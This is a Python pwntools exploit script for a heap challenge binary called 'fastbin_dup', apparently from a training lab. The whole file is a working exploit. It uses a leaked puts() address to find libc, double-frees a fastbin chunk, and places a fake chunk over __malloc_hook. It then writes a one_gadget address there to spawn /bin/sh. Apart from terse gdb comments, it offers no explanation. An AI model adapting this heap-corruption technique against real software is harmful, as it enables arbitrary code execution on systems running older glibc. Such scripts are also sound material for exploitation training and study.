#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

io.sendafter("username: ", "Slavique")
io.recvuntil("> ")

# Request two 0x70-sized chunks and fill them with data.
chunk_A = malloc(0x68, "A" * 0x68)
chunk_B = malloc(0x68, "B" * 0x68)

free(chunk_A)
free(chunk_B)
free(chunk_A)

# > find_fake_fast &__malloc_hook
# > p/x 0x7ffff7dd0b50 - 0x7ffff7dd0b2d
# 0x23
dup = malloc(0x68, p64(libc.sym["__malloc_hook"] - 0x23))

# the size of the fake chunk is 0x7f, so we have to adjust chunk sizes for them to be in the same fastbin
malloc(0x68, "Y")
malloc(0x68, "Y")

# malloc(0x68, p64(0xdeadbeef))
# > x/wx 0x7ffff7dd0b50 - 0x13
# 0x7ffff7dd0b3d: 0xdeadbeef

# > one_gadget
# 0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
malloc(0x68, b"\x00" * 0x13 + p64(libc.address + 0xe1fa1))

# Calling one_gadget
malloc(0x68, "")

# fastbin dup works on glibc<=2.31
io.interactive()
